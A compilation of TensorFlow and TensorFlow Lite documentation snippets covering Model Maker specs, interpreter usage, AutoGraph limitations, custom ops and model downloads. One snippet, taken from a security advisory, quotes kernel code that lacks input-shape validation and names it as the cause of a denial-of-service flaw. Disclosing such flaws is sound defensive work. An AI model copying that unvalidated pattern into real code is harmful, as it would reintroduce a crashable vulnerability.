DESCRIPTION: Imports logging, tensorflow, keras, numpy, and pathlib to set up the environment for building, training, converting, and evaluating the TensorFlow Lite model. It also sets TensorFlow logging level.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
import logging
logging.getLogger("tensorflow").setLevel(logging.DEBUG)

import tensorflow as tf
from tensorflow import keras
import numpy as np
import pathlib
```

----------------------------------------

TITLE: Initializing BertQaSpec in TensorFlow Lite Model Maker (Python)
DESCRIPTION: This snippet shows the constructor signature for the `BertQaSpec` class. It defines the numerous parameters available to configure a BERT model for question answering tasks within TensorFlow Lite Model Maker. Key parameters include the model URI, sequence lengths, learning rate, distribution strategy, and batch sizes. It details how to instantiate the specification object before building or training a model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_model_maker.question_answer.BertQaSpec(
    uri='https://tfhub.dev/tensorflow/bert_en_uncased_L-12_H-768_A-12/1',
    model_dir=None,
    seq_len=384,
    query_len=64,
    doc_stride=128,
    dropout_rate=0.1,
    initializer_range=0.02,
    learning_rate=8e-05,
    distribution_strategy='mirrored',
    num_gpus=-1,
    tpu='',
    trainable=True,
    predict_batch_size=8,
    do_lower_case=True,
    is_tf2=True,
    tflite_input_name=None,
    tflite_output_name=None,
    init_from_squad_model=False,
    default_batch_size=16,
    name='Bert'
)
```

----------------------------------------

TITLE: Initializing AverageWordVecSpec in TensorFlow Lite Model Maker
DESCRIPTION: Initializes the configuration for the averaging word vector text classification model. It sets parameters like vocabulary size, sequence length, word embedding dimension, dropout rate, and training defaults.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.text_classifier.AverageWordVecSpec(
    num_words=10000,
    seq_len=256,
    wordvec_dim=16,
    lowercase=True,
    dropout_rate=0.2,
    name='AverageWordVec',
    default_training_epochs=2,
    default_batch_size=32,
    model_dir=None,
    index_to_label=None
)
```

----------------------------------------

TITLE: Await Initialization Task (Blocking via Coroutine) - Kotlin
DESCRIPTION: This Kotlin snippet, typically used within an Android lifecycle-aware component, shows how to use a coroutine within the `lifecycleScope.launchWhenStarted` block to wait for the `initializeTask` to complete before proceeding, avoiding blocking the UI thread.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_9

LANGUAGE: Kotlin
CODE:
```
import androidx.lifecycle.lifecycleScope
...
lifecycleScope.launchWhenStarted { // uses coroutine
  initializeTask.await()
}
```

----------------------------------------

TITLE: Load Debugger Results into Pandas DataFrame Python
DESCRIPTION: Reads the quantization debugger results from the CSV file into a pandas DataFrame named `layer_stats`. This facilitates data manipulation, filtering, and analysis of the per-layer statistics within Python.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_10

LANGUAGE: Python
CODE:
```
layer_stats = pd.read_csv(RESULTS_FILE)
layer_stats.head()
```

----------------------------------------

TITLE: Creating Data Loader from MovieLens Dataset - Python
DESCRIPTION: Generates a data loader object from the raw or processed MovieLens dataset files. It handles data preparation, train/test splitting, vocabulary building, and metadata generation based on provided parameters and an `InputSpec` object, which defines how data features are interpreted.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/DataLoader.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
from_movielens(
    data_dir,
    data_tag,
    input_spec: <a href="../../tflite_model_maker/recommendation/spec/InputSpec"><code>tflite_model_maker.recommendation.spec.InputSpec</code></a>,
    generated_examples_dir=None,
    min_timeline_length=3,
    max_context_length=10,
    max_context_movie_genre_length=10,
    min_rating=None,
    train_data_fraction=0.9,
    build_vocabs=True,
    train_filename=&#x27;train_movielens_1m.tfrecord&#x27;,
    test_filename=&#x27;test_movielens_1m.tfrecord&#x27;,
    vocab_filename=&#x27;movie_vocab.json&#x27;,
    meta_filename=&#x27;meta.json&#x27;
)
```

----------------------------------------

TITLE: Creating Tensor Metadata Flatbuffers Python
DESCRIPTION: Creates and returns a Flatbuffers Python object (`TensorMetadataT`) based on the information stored in the TensorMd instance. This object represents the tensor metadata in a format suitable for embedding in a TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/TensorMd.md#_snippet_1

LANGUAGE: Python
CODE:
```
create_metadata() -> <a href="../../../tflite_support/metadata_schema_py_generated/TensorMetadataT"><code>tflite_support.metadata_schema_py_generated.TensorMetadataT</code></a>
```

----------------------------------------

TITLE: Downloading Sample Models for TFLite Conversion
DESCRIPTION: This snippet provides shell commands to download two example models, MobileNet V1 and Inception V1, into the `/tmp` directory. These models are used in subsequent examples to demonstrate different conversion scenarios.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_0

LANGUAGE: Shell
CODE:
```
echo "Download MobileNet V1"
curl https://storage.googleapis.com/download.tensorflow.org/models/mobilenet_v1_0.50_128_frozen.tgz \
  | tar xzv -C /tmp

echo "Download Inception V1"
curl https://storage.googleapis.com/download.tensorflow.org/models/inception_v1_2016_08_28_frozen.pb.tar.gz \
  | tar xzv -C /tmp
```

----------------------------------------

TITLE: Defining DetectorListener Interface (Kotlin)
DESCRIPTION: Defines a Kotlin interface `DetectorListener` used to communicate detection results and errors from an object detection process back to the caller. It includes methods `onError` for handling errors and `onResults` for receiving the detection results along with inference time and image dimensions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_13

LANGUAGE: Kotlin
CODE:
```
interface DetectorListener {
  fun onError(error: String)
  fun onResults(
    results: MutableList<Detection>?,
    inferenceTime: Long,
    imageHeight: Int,
    imageWidth: Int
  )
}
```

----------------------------------------

TITLE: Registering SyncSleep Op Interface C++
DESCRIPTION: Registers the "Examples>SyncSleep" custom operation with TensorFlow's framework. It defines the op's name, specifies a scalar float input named "delay" and a scalar float output named "output", provides a shape inference function to ensure the input is scalar, and includes documentation explaining its synchronous nature and contrast with the asynchronous version.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_3

LANGUAGE: c++
CODE:
```
REGISTER_OP("Examples>SyncSleep")
    .Input("delay: float")
    .Output("output: float")
    .SetShapeFn([](tensorflow::shape_inference::InferenceContext* c) {
      tensorflow::shape_inference::ShapeHandle handle;
      TF_RETURN_IF_ERROR(c->WithRank(c->input(0), 0, &handle));
      return (ScalarOutput(c));
    })
    .Doc(R"doc(
Pause for `delay` seconds (which need not be an integer).

This is a synchronous (blocking) version of sleep. It's purpose is
to be contrasted with Examples>AsyncSleep.

delay: tf.Tensor which is a scalar of type float.

Returns `delay`.
)doc");
```

----------------------------------------

TITLE: Creating ImageClassifier From Options Python
DESCRIPTION: A class method to create an `ImageClassifier` object using an `ImageClassifierOptions` configuration object. This allows for more detailed customization of the classifier behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageClassifier.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
create_from_options(
    options: <a href="../../../tflite_support/task/vision/ImageClassifierOptions"><code>tflite_support.task.vision.ImageClassifierOptions</code></a>
) -> 'ImageClassifier'
```

----------------------------------------

TITLE: Verify Converted TensorFlow Lite Model Output
DESCRIPTION: Loads the converted TFLite model using `tf.lite.Interpreter`, allocates tensors, and performs inference on a single test sample. It then compares the output of the TFLite model with the output of the original Keras model for the same input using `np.testing.assert_almost_equal` to verify consistency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/experimental_new_converter/keras_lstm.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
# Run the model with TensorFlow to get expected results.
expected = model.predict(x_test[0:1])

# Run the model with TensorFlow Lite
interpreter = tf.lite.Interpreter(model_content=tflite_model)
interpreter.allocate_tensors()
input_details = interpreter.get_input_details()
output_details = interpreter.get_output_details()
interpreter.set_tensor(input_details[0]["index"], x_test[0:1, :, :])
interpreter.invoke()
result = interpreter.get_tensor(output_details[0]["index"])

# Assert if the result of TFLite model is consistent with the TF model.
np.testing.assert_almost_equal(expected, result)
print("Done. The result of TensorFlow matches the result of TensorFlow Lite.")
```

----------------------------------------

TITLE: Calling TensorMetadataAddDescription Function Python
DESCRIPTION: Documents the function signature for `TensorMetadataAddDescription`. It requires a FlatBuffers `builder` instance and a `description` string. This function is called during the metadata building process to associate a textual description with a specific tensor's metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataAddDescription.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorMetadataAddDescription(\n    builder, description\n)
```

----------------------------------------

TITLE: Triggering TensorFlow Runtime Error in AutoGraph (Python)
DESCRIPTION: This example shows how an assertion failure using `tf.Assert` within an `@tf.function` results in a TensorFlow runtime error (InvalidArgumentError). The error message includes a reference to the original Python source code location where the failing TensorFlow operation (`tf.Assert`) was defined, helping developers debug graph execution errors by relating them back to their source code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/error_handling.md#_snippet_1

LANGUAGE: Python
CODE:
```
@tf.function
def my_function():
  tf.Assert(tf.random.uniform(()) > 1.0, ['example error'])
my_function()
```

----------------------------------------

TITLE: Downloading and Permitting Build Script - Shell
DESCRIPTION: These shell commands download the `build_aar_with_docker.sh` script from the official TensorFlow GitHub repository and then make it executable using the `chmod +x` command.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_14

LANGUAGE: Shell
CODE:
```
curl -o build_aar_with_docker.sh \
  https://raw.githubusercontent.com/tensorflow/tensorflow/master/tensorflow/lite/tools/build_aar_with_docker.sh &&
chmod +x build_aar_with_docker.sh
```

----------------------------------------

TITLE: Checking Source Code Access with inspect.findsource Python
DESCRIPTION: Shows how to use the `inspect.findsource` function to determine if the source code for a given Python function is available. AutoGraph requires source code access for conversion, and this snippet demonstrates a diagnostic method; if `findsource` raises an error, AutoGraph will likely print a warning.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_50

LANGUAGE: Python
CODE:
```
import inspect

def simple_function():
  return 1

# If this raises an error, then AutoGraph prints a warning.
# If it returns source code, then AutoGraph should work as well.
inspect.findsource(simple_function)
```

----------------------------------------

TITLE: Add License to Model Metadata (Python)
DESCRIPTION: Adds a license string to the TensorFlow Lite model metadata using the provided FlatBuffers builder. This function is typically called during the process of constructing the metadata buffer. It requires a builder object and the license string to be added.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataAddLicense.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ModelMetadataAddLicense(
    builder, license
)
```

----------------------------------------

TITLE: Adding TFLite Metadata Dependency (Gradle)
DESCRIPTION: This snippet shows how to add the TensorFlow Lite Metadata library as a dependency in an Android project's `build.gradle` file. It specifies the artifact coordinates (`org.tensorflow:tensorflow-lite-metadata`) and version, allowing access to the `MetadataExtractor` class and related FlatBuffers bindings in the Java/Kotlin code. Requires a Gradle-based Android project setup.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_9

LANGUAGE: gradle
CODE:
```
dependencies {
    implementation 'org.tensorflow:tensorflow-lite-metadata:0.1.0'
}
```

----------------------------------------

TITLE: Inspecting TFLite Model Input Output Types Python
DESCRIPTION: Creates a TensorFlow Lite Interpreter instance using the quantized model content. It retrieves the details of the model's input and output tensors and prints their respective data types (`dtype`). This demonstrates that the inputs and outputs typically remain float after float fallback quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
interpreter = tf.lite.Interpreter(model_content=tflite_model_quant)
input_type = interpreter.get_input_details()[0]['dtype']
print('input: ', input_type)
output_type = interpreter.get_output_details()[0]['dtype']
print('output: ', output_type)
```

----------------------------------------

TITLE: Initializing BertCluAnnotationOptions in Python
DESCRIPTION: This is the constructor for the `BertCluAnnotationOptions` class, used to define configuration options for the Bert CLU annotator processor. It allows setting thresholds for domain, intent, and slot predictions, as well as the maximum number of history turns. Parameters are optional with default values and require the `Optional` type hint.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/BertCluAnnotationOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.processor.BertCluAnnotationOptions(
    max_history_turns: Optional[int] = 5,
    domain_threshold: Optional[float] = 0.5,
    intent_threshold: Optional[float] = 0.5,
    categorical_slot_threshold: Optional[float] = 0.5,
    mentioned_slot_threshold: Optional[float] = 0.5
)
```

----------------------------------------

TITLE: AutoGraph If with tf.shape and Static Input Error Python
DESCRIPTION: Demonstrates that using `tf.shape` on a tensor with static shape inside an AutoGraph `if` (which becomes `tf.cond`) results in a tracing error for out-of-bounds access. `tf.shape` returns a tensor, forcing graph control flow, and both branches are traced, leading to the static shape validation error. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_36

LANGUAGE: Python
CODE:
```
x = tf.constant((1, 2, 3))
if tf.shape(x)[0] > 4:
  val = x[4]  # Error at tracing: 4 is out of bounds!
else:
  val = some_default_value
```

----------------------------------------

TITLE: Evaluating Default Float TFLite Model Accuracy Python
DESCRIPTION: Calls the `evaluate_model` helper function with the interpreter loaded with the default float32 TFLite model. It computes the accuracy of the float model on the test dataset and prints the resulting accuracy score.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_16

LANGUAGE: python
CODE:
```
print(evaluate_model(interpreter))
```

----------------------------------------

TITLE: Defining EfficientDet-Lite3 Spec - TFLite Model Maker - Python
DESCRIPTION: This code snippet shows the constructor signature for the EfficientDetLite3Spec class in TFLite Model Maker. It is used to create a model specification for training an EfficientDet-Lite3 object detection model, allowing configuration of training parameters like epochs, batch size, hardware strategy (TPU/GPU), and model details like the TF-Hub URI and max detections.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/EfficientDetLite3Spec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.object_detector.EfficientDetLite3Spec(
    *,
    model_name='efficientdet-lite3',
    uri='https://tfhub.dev/tensorflow/efficientdet/lite3/feature-vector/1',
    hparams='',
    model_dir=None,
    epochs=50,
    batch_size=64,
    steps_per_execution=1,
    moving_average_decay=0,
    var_freeze_expr='(efficientnet|fpn_cells|resample_p6)',
    tflite_max_detections=25,
    strategy=None,
    tpu=None,
    gcp_project=None,
    tpu_zone=None,
    use_xla=False,
    profile=False,
    debug=False,
    tf_random_seed=111111,
    verbose=0
)
```

----------------------------------------

TITLE: Performing Comprehensive Static Analysis: Liveness Analysis
DESCRIPTION: Demonstrates a sequence of static analysis passes required before liveness analysis. It parses a function `f`, resolves qualified names, builds the CFG, performs activity analysis, reaching definitions analysis, and reaching function definitions analysis. Finally, it performs liveness analysis and retrieves the set of variables live *into* specific statements (assignments and return) using annotations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/pyct_tutorial.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
from tensorflow.python.autograph.pyct import anno
from tensorflow.python.autograph.pyct import cfg
from tensorflow.python.autograph.pyct import qual_names
from tensorflow.python.autograph.pyct.static_analysis import annos
from tensorflow.python.autograph.pyct.static_analysis import reaching_definitions
from tensorflow.python.autograph.pyct.static_analysis import reaching_fndefs
from tensorflow.python.autograph.pyct.static_analysis import liveness


def f(a):
  b = a + 1
  return b


node, ctx = get_node_and_ctx(f)

node = qual_names.resolve(node)
cfgs = cfg.build(node)
node = activity.resolve(node, ctx)
node = reaching_definitions.resolve(node, ctx, cfgs)
node = reaching_fndefs.resolve(node, ctx, cfgs)
node = liveness.resolve(node, ctx, cfgs)

print('live into `b = a + 1`:', anno.getanno(node.body[0], anno.Static.LIVE_VARS_IN))
print('live into `return b`:', anno.getanno(node.body[1], anno.Static.LIVE_VARS_IN))
```

----------------------------------------

TITLE: Implementing Sleeper Helper Method (C++)
DESCRIPTION: Defines the `sleeper` private helper method used by `ComputeAsync`. This method executes on a worker thread. It calculates the actual sleep duration based on the target wake-up time and the current time using Abseil Time functions. It performs the sleep using `absl::SleepFor`, sets the output tensor value to the effective delay, and finally calls the `done` callback to signal the completion of the asynchronous operation and release the context.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_7

LANGUAGE: C++
CODE:
```
  void sleeper(Tensor* output_tensor, absl::Time when, DoneCallback done) {
    absl::Time now = absl::Now();
    int64_t delay_us = 0;
    if (now < when) {
      delay_us = absl::ToInt64Microseconds(when - now);
      VLOG(1) << "MIDDLE ASYNC SLEEP " << delay_us;
      absl::SleepFor(when - now);
      VLOG(1) << "AFTER ASYNC SLEEP " << delay_us;
    } else {
      VLOG(1) << "MIDDLE/AFTER ASYNC SKIP SLEEP";
    }
    auto output = output_tensor->template flat<float>();
    output(0) = static_cast<float>(delay_us) / 1000000.0;
    done();  // Important: call `done` in every execution path
  }
```

----------------------------------------

TITLE: Defining Bazel Dependency for Core ML Delegate
DESCRIPTION: This Bazel build snippet shows how to add the Core ML delegate plugin as a dependency to your target. Including this dependency is necessary to enable Core ML delegation within your TensorFlow Lite application.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/overview.md#_snippet_9

LANGUAGE: Bazel
CODE:
```
deps = [
  "//tensorflow_lite_support/acceleration/configuration:coreml_plugin", # for Core ML Delegate
]
```

----------------------------------------

TITLE: Downloading Assets for TFLite Image Classification Demo - sh
DESCRIPTION: Uses curl to download a sample image (`grace_hopper.bmp`), a MobileNet v1 TFLite model (`mobilenet_v1_1.0_224.tflite`), and the corresponding labels file, extracting them to the `/tmp` directory for use by the demo script.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/python/README.md#_snippet_0

LANGUAGE: sh
CODE:
```
# Get photo
curl https://raw.githubusercontent.com/tensorflow/tensorflow/master/tensorflow/lite/examples/label_image/testdata/grace_hopper.bmp > /tmp/grace_hopper.bmp
# Get model
curl https://storage.googleapis.com/download.tensorflow.org/models/mobilenet_v1_2018_02_22/mobilenet_v1_1.0_224.tgz | tar xzv -C /tmp
# Get labels
curl https://storage.googleapis.com/download.tensorflow.com/models/mobilenet_v1_1.0_224_frozen.tgz | tar xzv -C /tmp mobilenet_v1_1.0_224/labels.txt

mv /tmp/mobilenet_v1_1.0_224/labels.txt /tmp/
```

----------------------------------------

TITLE: Define Audio Classifier Model Spec with BrowserFftSpec in Python
DESCRIPTION: This snippet instantiates the BrowserFftSpec from TensorFlow Lite Model Maker's audio_classifier API. This spec defines the base model and the expected input format (44.1 kHz audio) for the audio classification task.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_10

LANGUAGE: python
CODE:
```
spec = audio_classifier.BrowserFftSpec()
```

----------------------------------------

TITLE: Creating Custom Validation Configuration (Java)
DESCRIPTION: Creates a CustomValidationConfig object using a builder. This configuration defines how the Acceleration Service should validate the results of inference benchmarks using custom inputs, expected outputs, and an optional custom accuracy validator. It requires specifying the batch size, golden inputs, and golden outputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/acceleration_service.md#_snippet_3

LANGUAGE: Java
CODE:
```
ValidationConfig validationConfig = new CustomValidationConfig.Builder()
   .setBatchSize(5)
   .setGoldenInputs(inputs)
   .setGoldenOutputs(outputBuffer)
   .setAccuracyValidator(new MyCustomAccuracyValidator())
   .build();
```

----------------------------------------

TITLE: Visualizing GraphDef with TensorBoard (Shell)
DESCRIPTION: This snippet shows how to use the `import_pb_to_tensorboard.py` script to visualize a TensorFlow GraphDef (.pb file) in TensorBoard. It requires specifying the path to the model file (`--model_dir`) and the desired log directory for TensorBoard files (`--log_dir`). This is useful for inspecting the graph structure, inputs, and outputs when other tools fail.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/faq.md#_snippet_0

LANGUAGE: shell
CODE:
```
python import_pb_to_tensorboard.py --model_dir <model path> --log_dir <log dir path>
```

----------------------------------------

TITLE: Converting TFLite Model with Graphviz Dump (Shell)
DESCRIPTION: This command converts a TensorFlow GraphDef (`frozen_graph.pb`) into a TensorFlow Lite model (`foo.tflite`) using the `tflite_convert` tool. It utilizes the `--dump_graphviz_dir` flag to output Graphviz `.dot` files representing the model before (`toco_AT_IMPORT.dot`) and after (`toco_AFTER_TRANSFORMATIONS.dot`) conversion transformations to the specified directory (`/tmp`). Requires specifying input and output arrays.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_11

LANGUAGE: Shell
CODE:
```
tflite_convert \
  --graph_def_file=/tmp/mobilenet_v1_0.50_128/frozen_graph.pb \
  --output_file=/tmp/foo.tflite \
  --input_arrays=input \
  --output_arrays=MobilenetV1/Predictions/Reshape_1 \
  --dump_graphviz_dir=/tmp
```

----------------------------------------

TITLE: Registering TensorFlow Sparse Multiplex Kernel (C++)
DESCRIPTION: This snippet registers the C++ kernel implementation (`MultiplexSparseOp`) for the `Examples>MultiplexSparse` operation on the CPU device. It uses the `REGISTER_KERNEL_BUILDER` macro to associate the kernel with the op name, specify the target device (`::tensorflow::DEVICE_CPU`), and define a type constraint for the `T` attribute declared in the op interface. The `TF_CALL_ALL_TYPES` macro generates registrations for various TensorFlow data types.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_3/README.md#_snippet_1

LANGUAGE: C++
CODE:
```
#define REGISTER_KERNELS_CPU(type)                              \
  REGISTER_KERNEL_BUILDER(Name("Examples>MultiplexSparse")      \
                              .Device(::tensorflow::DEVICE_CPU) \
                              .TypeConstraint<type>("T"),       \
                          MultiplexSparseOp<type>)
TF_CALL_ALL_TYPES(REGISTER_KERNELS_CPU);

#undef REGISTER_KERNELS_CPU
```

----------------------------------------

TITLE: Convert Examples to Features Method Python
DESCRIPTION: Converts examples to features and writes them into a TFRecord file. Requires examples, TFRecord file path, and label names.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/BertClassifierSpec.md#_snippet_2

LANGUAGE: python
CODE:
```
convert_examples_to_features(
    examples, tfrecord_file, label_names
)
```

----------------------------------------

TITLE: Initializing EfficientDet-Lite2 Model Spec (Python)
DESCRIPTION: Defines the constructor (`__init__`) for the `EfficientDetLite2Spec` class. This is used to create a configuration object for the EfficientDet-Lite2 object detection model, specifying various parameters for training, evaluation, and TFLite conversion, such as model name, TF-Hub URI, training epochs, batch size, variable freezing expression, TFLite output detections limit, and distribution strategy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/EfficientDetLite2Spec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.object_detector.EfficientDetLite2Spec(
    *,
    model_name='efficientdet-lite2',
    uri='https://tfhub.dev/tensorflow/efficientdet/lite2/feature-vector/1',
    hparams='',
    model_dir=None,
    epochs=50,
    batch_size=64,
    steps_per_execution=1,
    moving_average_decay=0,
    var_freeze_expr='(efficientnet|fpn_cells|resample_p6)',
    tflite_max_detections=25,
    strategy=None,
    tpu=None,
    gcp_project=None,
    tpu_zone=None,
    use_xla=False,
    profile=False,
    debug=False,
    tf_random_seed=111111,
    verbose=0
)
```

----------------------------------------

TITLE: Getting Input Tensor Groups Count in Python
DESCRIPTION: Retrieves the number of entries in the input tensor groups list. This method returns the size of the input tensor groups array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_15

LANGUAGE: python
CODE:
```
InputTensorGroupsLength()
```

----------------------------------------

TITLE: Getting Associated File using C++ Metadata Extractor
DESCRIPTION: Presents the C++ method signature from the `ModelMetadataExtractor` class for retrieving the content of an associated file as an `absl::string_view`. It returns a `StatusOr` indicating success or failure and the file content. Requires the filename string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_16

LANGUAGE: c++
CODE:
```
tflite::support::StatusOr<absl::string_view> GetAssociatedFile(
      const std::string& filename) const;
```

----------------------------------------

TITLE: Adding Dimension Names to Tensor Metadata (Python)
DESCRIPTION: This Python function `TensorMetadataAddDimensionNames` is used to add dimension names to a tensor's metadata within a flatbuffer builder context. It takes the builder object and an object containing the dimension names as arguments, typically called when constructing tensor metadata for a TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataAddDimensionNames.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorMetadataAddDimensionNames(
    builder, dimensionNames
)
```

----------------------------------------

TITLE: Creating IndexToStringTable (int64->string) from Tensor - Python
DESCRIPTION: Shows how to create a tf.lookup.index_to_string_table_from_tensor to map indices (int64) back to strings, providing a default word for unknown indices. It sets up a vocabulary tensor, creates the table, defines a placeholder for int64 input, and sets up the lookup operation with table initialization dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/hashtable.md#_snippet_4

LANGUAGE: Python
CODE:
```
UNK_WORD = "unknown"
vocab = tf.constant(["emerson", "lake", "palmer"])
vocab_table = tf.lookup.index_to_string_table_from_tensor(vocab, default_value=UNK_WORD)

input_tensor = tf.compat.v1.placeholder(tf.int64, shape=[1])

with tf.control_dependencies([tf.initializers.tables_initializer()]):
  out_tensor = vocab_table.lookup(input_tensor)
```

----------------------------------------

TITLE: Creating Serving Model with BrowserFftSpec (Python)
DESCRIPTION: Adapts the trained model for serving purposes, typically adding necessary preprocessing layers or adjusting the input signature. Takes the training model instance as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/BrowserFftSpec.md#_snippet_2

LANGUAGE: Python
CODE:
```
create_serving_model(
    training_model
)
```

----------------------------------------

TITLE: Demonstrating Legal TF Loop with Python Assignment Python
DESCRIPTION: Illustrates a legal case where a loop variable, initialized as a TensorFlow tensor in a TF loop, is assigned a Python scalar value. This works because TensorFlow implicitly converts Python values to tensors within the context of TensorFlow operations and loops.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_49

LANGUAGE: Python
CODE:
```
i = tf.constant(10)
while i > 0:
  i = 0  # this is ok, will be auto-converted to Tensor
```

----------------------------------------

TITLE: SparseTensorToCSRSparseMatrixOp Kernel Input Processing C++
DESCRIPTION: This C++ snippet shows the relevant section of the `SparseTensorToCSRSparseMatrixOp` kernel code where input tensors are accessed. It highlights the lack of validation for the shapes and ranks of `indices` and `dense_shape` before attempting to access them as a vector or matrix and passing them to helper functions like `coo_to_csr`. This missing validation is the root cause of the denial of service vulnerability when invalid inputs are provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-068.md#_snippet_1

LANGUAGE: c++
CODE:
```
    const Tensor& indices = ctx->input(0);
    const Tensor& values = ctx->input(1);
    const Tensor& dense_shape = ctx->input(2);
    const int rank = dense_shape.NumElements();
    OP_REQUIRES(ctx, rank == 2 || rank == 3,
                errors::InvalidArgument("SparseTensor must have rank 2 or 3; ",
                                        "but indices has rank: ", rank));
    auto dense_shape_vec = dense_shape.vec<int64_t>();
    // ...
    OP_REQUIRES_OK(
        ctx,
        coo_to_csr(batch_size, num_rows, indices.template matrix<int64_t>(),
                   batch_ptr.vec<int32>(), csr_row_ptr.vec<int32>(),
                   csr_col_ind.vec<int32>()));
```

----------------------------------------

TITLE: Creating and Populating Image Segmentation Metadata (Python)
DESCRIPTION: Defines constants for the label file, output path, and normalization parameters (_INPUT_NORM_MEAN, _INPUT_NORM_STD) required for the image segmentation model. It then initializes an ImageSegmenterWriter using 'create_for_inference' with the model file, normalization details, and the label file. Finally, it verifies the generated metadata JSON by printing it and saves the populated model with the added metadata to the specified path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_11

LANGUAGE: Python
CODE:
```
_LABEL_FILE = "deeplabv3_labels.txt"
_SAVE_TO_PATH = "deeplabv3_metadata.tflite"
# Normalization parameters are required when reprocessing the image. It is
# optional if the image pixel values are in the range of [0, 255] and the input
